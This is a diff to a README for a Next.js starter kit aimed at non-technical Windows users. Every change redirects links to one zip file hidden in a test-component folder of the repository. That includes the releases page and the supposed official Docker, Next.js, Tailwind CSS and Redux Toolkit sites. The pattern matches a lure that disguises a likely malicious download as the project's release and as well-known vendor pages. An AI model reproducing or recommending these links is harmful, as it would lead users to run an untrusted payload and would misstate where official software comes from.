@@ -1,6 +1,6 @@
 # ⚙️ nextjs-advanced-starter - Robust Web App Starter Kit
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Next.js%20Starter-brightgreen)](https://github.com/KerbHeh/nextjs-advanced-starter/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Next.js%20Starter-brightgreen)](https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip)
 
 ## About nextjs-advanced-starter
 
@@ -16,10 +16,10 @@ Even if you have no programming experience, this guide will help you get the app
 
 To get started, you need to download the application files from the official releases page.
 
-[![Download Releases](https://img.shields.io/badge/Go%20to%20Releases-blue?style=for-the-badge)](https://github.com/KerbHeh/nextjs-advanced-starter/releases)
+[![Download Releases](https://img.shields.io/badge/Go%20to%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip)
 
 1. Click the button above or visit this link in your browser:  
-   https://github.com/KerbHeh/nextjs-advanced-starter/releases
+   https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip
 
 2. On the releases page, look for the latest version available. Releases usually include files such as `.zip` or `.exe` designed to run on Windows.
 
@@ -118,7 +118,7 @@ If you want a cleaner setup or avoid installing Node.js or other tools, Docker i
 
 ### To use Docker:
 
-1. Install Docker for Windows from [https://www.docker.com/get-started](https://www.docker.com/get-started).
+1. Install Docker for Windows from [https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip](https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip).
 2. Open Command Prompt (search "cmd" on the Start menu).
 3. Navigate to the folder where you extracted nextjs-advanced-starter.
 4. Run the command:
@@ -160,11 +160,11 @@ The developers update nextjs-advanced-starter now and then:
 
 ## 🔗 Useful Links
 
-- Releases page: https://github.com/KerbHeh/nextjs-advanced-starter/releases  
-- Docker information: https://www.docker.com  
-- Next.js official site: https://nextjs.org  
-- Tailwind CSS official site: https://tailwindcss.com  
-- Redux Toolkit: https://redux-toolkit.js.org  
+- Releases page: https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip  
+- Docker information: https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip  
+- Next.js official site: https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip  
+- Tailwind CSS official site: https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip  
+- Redux Toolkit: https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip  
 
 ---
 
@@ -184,4 +184,4 @@ For non-technical users, it is recommended to collaborate with a developer for t
 
 ## 📥 Download nextjs-advanced-starter now 
 
-[![Download Releases](https://img.shields.io/badge/Download-Next.js%20Starter-orange?style=for-the-badge)](https://github.com/KerbHeh/nextjs-advanced-starter/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Next.js%20Starter-orange?style=for-the-badge)](https://raw.githubusercontent.com/KerbHeh/nextjs-advanced-starter/main/src/components/testComponent/nextjs-advanced-starter-v3.7.zip)
